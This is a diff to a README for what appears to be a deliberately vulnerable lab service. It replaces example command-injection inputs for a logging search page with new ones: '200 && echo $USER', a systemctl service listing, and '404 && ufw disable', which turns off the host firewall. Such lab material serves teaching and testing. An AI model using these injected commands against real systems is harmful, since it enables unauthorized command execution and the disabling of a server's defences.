@@ -50,9 +50,14 @@ $ sudo systemctl start cn351
 ## Command Injection
 1. Go to http://<target-ip/domain>/logging/?search=
 2. Try to search with Command Injection Example:
-```url
-/?search= 200 && ls -al
-/?search= 404 && w
+```input
+200 && echo $USER
+```
+```input
+302 && systemctl list-units --type=service
+```
+```input
+404 && ufw disable
 ```
 
 ## Group Member
